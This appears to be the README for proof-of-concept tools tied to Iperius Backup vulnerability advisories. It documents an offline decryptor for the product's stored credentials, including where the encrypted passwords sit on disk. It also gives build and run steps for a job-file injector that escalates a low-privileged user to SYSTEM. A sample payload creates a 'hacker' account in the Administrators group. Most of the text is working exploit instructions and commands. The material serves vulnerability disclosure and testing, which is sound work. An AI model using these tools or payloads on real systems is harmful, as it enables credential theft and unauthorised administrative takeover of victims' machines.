# Iperius Backup PoC Tools

This directory contains two Proof-of-Concept tools for the vulnerabilities described in the advisories.

> :warning: **Warning:** Use these tools only in a controlled test environment. Do **not** run on production systems!

---

## Tool 1: Credential Decryptor (`decrypt_iperius.py`)

Standalone Python script that decrypts any Iperius Backup credential offline. No Iperius installation required.

### Requirements

- Python 3.6+
- `cryptography` library

```bash
pip install cryptography
```

### Usage

**Decrypt a single credential:**

```bash
python3 decrypt_iperius.py '<base64_ciphertext>'
```

**Example:**

```bash
$ python3 decrypt_iperius.py 'tj1G8QXCPZM+FdRHSeA9SFNeupWnrTAC'
Decrypted: p@ssw0rd
```

**Decrypt with a custom password (non-default):**

```bash
python3 decrypt_iperius.py '<base64_ciphertext>' '<custom_password>'
```

### How It Works

1. Derives the AES-256 key from the hardcoded password using SHA-1 + key expansion
2. Extracts the 8-byte IV seed from the ciphertext
3. Decrypts using AES-256-CBC
4. Returns the UTF-16LE decoded plaintext

### Where to Find Encrypted Credentials

Encrypted credentials are stored in:

```
C:\ProgramData\IperiusBackup\IperiusAccounts.ini
```

Look for `Password=` fields in each account section.

---

## Tool 2: Job File Injector (`iperius_job_inject.c`)

C program that automates the full privilege escalation chain: reads MachineGuid, derives the AES-128 key, encrypts a payload command, and generates a malicious `.ibj` job file.

### Build Requirements

- Windows with a C compiler (MSVC or MinGW)

### Target Requirements

- Iperius Backup installed and running as a service
- Low-privileged user account (no admin required)

### Compilation

**Using MSVC (Developer Command Prompt):**

```cmd
cl.exe iperius_job_inject.c /link bcrypt.lib crypt32.lib advapi32.lib
```

**Using MinGW:**

```cmd
gcc iperius_job_inject.c -o iperius_job_inject.exe -lbcrypt -lcrypt32 -ladvapi32
```

### Usage

1. Compile the PoC and transfer the binary to the target system
2. Run as any local user:

```cmd
iperius_job_inject.exe
```

3. The program will:
   - Read `MachineGuid` from the registry
   - Derive the AES-128 encryption key
   - Encrypt the payload command (`cmd` by default)
   - Write `Job321.ibj` to `C:\ProgramData\IperiusBackup\Jobs\`
   - Set `RunOnceAsServiceDateTime` to trigger within ~1 minute

4. Wait for the Iperius Backup service to process the job file
5. The payload executes under `NT AUTHORITY\SYSTEM`

### Customization

To change the payload command, modify the `payload` variable in `main()`:

```c
const wchar_t* payload = L"cmd /c net user hacker P@ss123 /add && net localgroup Administrators hacker /add";
```

To change the output filename:

```c
const char* filename = "C:\\ProgramData\\IperiusBackup\\Jobs\\Job999.ibj";
```

### Expected Output

```
Payload encrypted successfully: <base64_encrypted_command>
Local Delphi Date generated: 46049:5234567890
File C:\ProgramData\IperiusBackup\Jobs\Job321.ibj created successfully.
```

---

## Security Notes

- The credential decryptor works **offline** — no network or Iperius installation needed
- The job injector requires **local access** to the target machine
- Both tools demonstrate vulnerabilities that exist in Iperius Backup v8.7.2 and earlier
- v8.7.4 partially addresses these issues (DPAPI for credentials, folder hardening option)
